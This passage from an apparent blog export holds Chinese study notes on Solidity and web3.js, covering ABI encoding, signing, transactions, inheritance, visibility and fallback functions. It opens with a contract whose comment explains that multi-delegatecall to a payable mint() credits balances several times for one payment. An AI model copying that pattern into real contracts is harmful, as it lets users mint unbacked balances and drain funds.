mapping(address=&gt;uint)public balanceOf;</span><br><span class="line">  event <span class="title function_">Log</span><span class="params">(address caller,<span class="built_in">string</span> func,uint i)</span>;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">func1</span><span class="params">(uint x,uint y)</span>external&#123;</span><br><span class="line">    emit <span class="title function_">Log</span><span class="params">(msg.sender,<span class="string">&quot;func1&quot;</span>,x+y)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">func2</span><span class="params">()</span>external <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">    emit <span class="title function_">Log</span><span class="params">(msg.sender,<span class="string">&quot;func2&quot;</span>,<span class="number">2</span>)</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">mint</span><span class="params">()</span>external payable&#123;</span><br><span class="line">    balanceOf[msg.sender]+=msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果在本合约中多重委托调用mint，则输入一次msg.value账户的balanceOf会增加n次</span></span><br><span class="line">  <span class="comment">//n就是多重调用的次数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="abi解码"><a href="#abi解码" class="headerlink" title="abi解码"></a>abi解码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract AbiDecode&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span>&#123;</span></span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    uint[<span class="number">2</span>] nums;</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">encode</span><span class="params">(uint x,address addr,uint[]calldata arr,MyStruct calldata myStruct)</span></span><br><span class="line">    external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> abi.encode(x,addr,arr,myStruct);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解码函数</span></span><br><span class="line">  function <span class="title function_">decode</span><span class="params">(bytes calldata data)</span>external pure <span class="title function_">returns</span><span class="params">(</span></span><br><span class="line"><span class="params">    uint x,address addr,uint[]memory arr,MyStruct memory myStruct</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">  &#123;</span><br><span class="line">    (x,addr,arr,myStruct)=abi.decode(data,(uint,address,uint[],MyStruct));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web3.js学习笔记</title>
      <link href="/2022/10/28/web3.js/web3.js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/28/web3.js/web3.js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="起始公式"><a href="#起始公式" class="headerlink" title="起始公式"></a>起始公式</h1><p>var Web3&#x3D; require(‘web3’)<br>const rpcURL &#x3D; “<a href="https://goerli.infura.io/v3/+key">https://goerli.infura.io/v3/+key</a>“<br>const web3 &#x3D; new Web3(rpcURL)</p><h2 id="消息签名"><a href="#消息签名" class="headerlink" title="消息签名"></a>消息签名</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dataHash = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">let</span> privateKey = <span class="string">&quot;0x&quot;</span></span><br><span class="line"><span class="keyword">let</span> sign = web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">sign</span>(dataHash, privateKey)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;signature&quot;</span>, sign.<span class="property">signature</span>)    </span><br></pre></td></tr></table></figure><h2 id="区块信息查询"><a href="#区块信息查询" class="headerlink" title="区块信息查询"></a>区块信息查询</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlockNumber</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlock</span>();<span class="comment">//&#x27;latest&#x27;,&#x27;earliest&#x27;,&#x27;pending&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.false默认不返回交易详细信息，true返回详细的交易信息 </span></span><br><span class="line"><span class="comment">//2.getBlock中可以通过区块哈希区块高度来查看区块信息</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlock</span>(<span class="string">&quot;latest&quot;</span>,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h2 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询所有账户地址</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getAccounts</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新的账户</span></span><br><span class="line"><span class="comment">//(password,[callback])</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="property">personal</span>.<span class="title function_">newAccount</span>(<span class="string">&#x27;jjk1323423&#x27;</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看挖矿获奖的账户</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getCoinbase</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">isMining</span>().<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);<span class="comment">//挖矿是否正在进行</span></span><br></pre></td></tr></table></figure><h2 id="查询用户余额及平均gas"><a href="#查询用户余额及平均gas" class="headerlink" title="查询用户余额及平均gas"></a>查询用户余额及平均gas</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询用户余额</span></span><br><span class="line"><span class="comment">//(address ,[,defaultBlock])</span></span><br><span class="line"><span class="comment">//1.defaultBlock：表示执行到指定区块的余额</span></span><br><span class="line"><span class="comment">//function为回调函数</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBalance</span>(<span class="string">&#x27;0x8aC8215492Ce132Eb4d1db7EcE3eF0caF670deFf&#x27;</span>,<span class="keyword">function</span>(<span class="params">error,result</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> balance=result.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(web3.<span class="property">utils</span>.<span class="title function_">fromWei</span>(balance,<span class="string">&quot;ether&quot;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//gas价格查询</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getGasPrice</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wei:&quot;</span>+result)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ether:&quot;</span>+web3.<span class="property">utils</span>.<span class="title function_">fromWei</span>(result,<span class="string">&quot;ether&quot;</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="交易有关内容"><a href="#交易有关内容" class="headerlink" title="交易有关内容"></a>交易有关内容</h2><h3 id="1-发送交易"><a href="#1-发送交易" class="headerlink" title="1. 发送交易"></a>1. 发送交易</h3><p>(transactionObiect,[,callback])<br>transactionObject{<br>    from:<br>    to:<br>    value:<br>    gas:<br>    gasPrice:<br>    data:若发送的为合约，则为合约的ABI文件，否则，则说明信息<br>    noce:这是账号的前一个交易计数，这个值必须为16进制<br>    可以使用Web3.js的web3.utils.toHex()转化</p><p>}</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> transactionObiect=&#123;</span><br><span class="line">    <span class="attr">from</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">to</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">value</span>:web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="attr">data</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(transactionObiect).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure><h3 id="2-查询交易信息"><a href="#2-查询交易信息" class="headerlink" title="2.查询交易信息"></a>2.查询交易信息</h3><p>getTransactionFromBlock(hashStringOrNumber,indexNumber,[,callback])<br>1.hashStringOrNumber为: 区块号or区块哈希or earliest等<br>2.indexNumber为区块中交易索引，索引从0开始</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionFromBlock</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>或者这个也可以</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransaction</span>(<span class="string">&#x27;hash&#x27;</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回指定区块发出的交易数量</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getBlockTransactionCount</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询交易收据</span></span><br><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getTransactionReceipt</span>(<span class="string">&quot;hash&quot;</span>).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -web3.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（二）</title>
      <link href="/2022/10/28/solidity/%E6%9D%82%E4%B9%B1/(%E4%BA%8C)solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/10/28/solidity/%E6%9D%82%E4%B9%B1/(%E4%BA%8C)solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity基础知识点（二）"><a href="#solidity基础知识点（二）" class="headerlink" title="solidity基础知识点（二）"></a>solidity基础知识点（二）</h1><h2 id="事件知识点"><a href="#事件知识点" class="headerlink" title="事件知识点"></a>事件知识点</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Event &#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> message,uint val)</span>;</span><br><span class="line">    event <span class="title function_">IndexedLog</span><span class="params">(address indexed sender,uint val)</span>;</span><br><span class="line">    function <span class="title function_">example</span><span class="params">()</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;foo&quot;</span>,<span class="number">123</span>)</span>;</span><br><span class="line">        emit <span class="title function_">IndexedLog</span><span class="params">(msg.sender,<span class="number">123</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event <span class="title function_">Message</span><span class="params">(address indexed _from,address indexed _to,<span class="built_in">string</span> message)</span>;</span><br><span class="line">    function <span class="title function_">sendMessage</span><span class="params">(address _to,<span class="built_in">string</span> calldata message)</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Message</span><span class="params">(msg.sender,_to,message)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承与多线继承"><a href="#继承与多线继承" class="headerlink" title="继承与多线继承"></a>继承与多线继承</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span>  public  virtual <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;<span class="comment">//需要被继承的合约要加virtual</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public virtual <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Aa</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B is A&#123;</span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span> public virtual override <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;<span class="comment">//加继承的函数加override</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public virtual override <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Bb</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract C is A, B&#123;<span class="comment">//多线继承，最基础的放在最前面，然后依次排列</span></span><br><span class="line">    function <span class="title function_">pop</span><span class="params">()</span>public pure <span class="title function_">override</span><span class="params">(A,B)</span> <span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">hip</span><span class="params">()</span>public pure <span class="title function_">override</span> <span class="params">(A,B)</span><span class="title function_">returns</span><span class="params">(<span class="built_in">string</span> memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承构造函数传入参数的知识"><a href="#继承构造函数传入参数的知识" class="headerlink" title="继承构造函数传入参数的知识"></a>继承构造函数传入参数的知识</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract S&#123;</span><br><span class="line">    <span class="built_in">string</span> public name;</span><br><span class="line">    constructor(<span class="built_in">string</span> memory _name)&#123;</span><br><span class="line">        name=_name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract T&#123;</span><br><span class="line">    <span class="built_in">string</span> public text;</span><br><span class="line">    constructor(<span class="built_in">string</span> memory _text)&#123;</span><br><span class="line">        text=_text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract U is <span class="title function_">S</span><span class="params">(<span class="string">&quot;S&quot;</span>)</span>,<span class="title function_">T</span><span class="params">(<span class="string">&quot;t&quot;</span>)</span>&#123;<span class="comment">//已知输入内容</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">contract V is S ,T&#123;<span class="comment">//按照继承的顺序来运行，所以先传入S，后传入T</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory _name,<span class="built_in">string</span> memory _text )S(_name) T(_text)&#123;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="comment">//构造函数时传入 当然U和V这两种方法是可以合并的</span></span><br></pre></td></tr></table></figure><h2 id="如何调用父级合约"><a href="#如何调用父级合约" class="headerlink" title="如何调用父级合约"></a>如何调用父级合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">contract E&#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> msesage)</span>;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;E.foo&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span><span class="params">()</span>public virtual &#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;E.bar&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract F is E&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;F.foo&quot;</span>)</span>;</span><br><span class="line">        E.foo();<span class="comment">//直接调用v</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span> <span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;F.bar&quot;</span>)</span>;</span><br><span class="line">        super.bar();<span class="comment">//super方法调用，自己会寻找父级合约</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract G is E&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;G.foo&quot;</span>)</span>;</span><br><span class="line">        E.foo();</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span><span class="params">()</span>public virtual override&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;G.bar&quot;</span>)</span>;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract H is F, G&#123;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>public <span class="title function_">override</span><span class="params">(F,G)</span>&#123;</span><br><span class="line">        F.foo();<span class="comment">//直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">bar</span> <span class="params">()</span>public <span class="title function_">override</span><span class="params">(F,G)</span>&#123;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可视范围知识点"><a href="#可视范围知识点" class="headerlink" title="可视范围知识点"></a>可视范围知识点</h2><p>-private  只能合约内部可见<br>-internal 只能内部或者被继承的子合约中可见<br>-public  内外部均可见<br>-external 只能从外部可见，继承子合约中不可见</p><p>1.如果有一个外部合约C调用一个合约A，那么C合约只能看到A合约的public与external合约函数，其他都不行<br>2.继承只能看到internal和public </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract visibility&#123;</span><br><span class="line">    uint private x=<span class="number">0</span>;</span><br><span class="line">    uint internal y=<span class="number">1</span>;</span><br><span class="line">    uint public z=<span class="number">2</span>;</span><br><span class="line">    function <span class="title function_">privateFunc</span><span class="params">()</span>private pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">internalFunc</span><span class="params">()</span>internal pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">publicFunc</span><span class="params">()</span>public pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">200</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">externalFunc</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external view&#123;</span><br><span class="line">        x+y+z;</span><br><span class="line">        privateFunc();</span><br><span class="line">        internalFunc();</span><br><span class="line">        publicFunc();</span><br><span class="line">        this.externalFunc();<span class="comment">//可以通过这样来访问外部函数。原理:先到合约外部在到内部从而访问external函数。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="不可变量"><a href="#不可变量" class="headerlink" title="不可变量"></a>不可变量</h2><p>不可变量immutable用的时候必须赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Immutable&#123;</span><br><span class="line">    address public immutable owner = msg.sender;<span class="comment">//像定义常量一样节约gas费，同样owner永不可变</span></span><br><span class="line">   <span class="comment">// constructor()&#123;</span></span><br><span class="line">    <span class="comment">//    owner=msg.sender;可在构建函数时赋值 </span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    uint public x;</span><br><span class="line">    function <span class="title function_">foo</span><span class="params">()</span>external&#123;</span><br><span class="line">        require (msg.sender == owner);</span><br><span class="line">        x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="支付payable属性与回退函数运用"><a href="#支付payable属性与回退函数运用" class="headerlink" title="支付payable属性与回退函数运用"></a>支付payable属性与回退函数运用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract Payable&#123;</span><br><span class="line">    address payable public owner;<span class="comment">//这样的话就可以发送钱了</span></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner =payable(msg.sender);</span><br><span class="line">        <span class="comment">//owner=msg.sender ;这样不行    //因为owner有payable的属性，所以构造函数要有payable的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">deposit</span><span class="params">()</span>external payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">getBalance</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//回退函数</span></span><br><span class="line"></span><br><span class="line">contract Fallback&#123;<span class="comment">//有数据则会触发fallback</span></span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(<span class="built_in">string</span> func,address sender,uint value,bytes  data)</span>;</span><br><span class="line">    fallback()external payable&#123;<span class="comment">//可接受主币的发送</span></span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;fallback&quot;</span>,msg.sender,msg.value,msg.data)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;<span class="comment">//无数据则会触发receive，如果没有receive则会触发fallback</span></span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(<span class="string">&quot;receive&quot;</span>,msg.sender,msg.value,<span class="string">&quot;&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="发送以太币三种方法"><a href="#发送以太币三种方法" class="headerlink" title="发送以太币三种方法"></a>发送以太币三种方法</h2><p>· transfer 2300 gas,reverts<br>· sender -2300 gas returns  bool<br>· call - all gas,returns bool and data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span 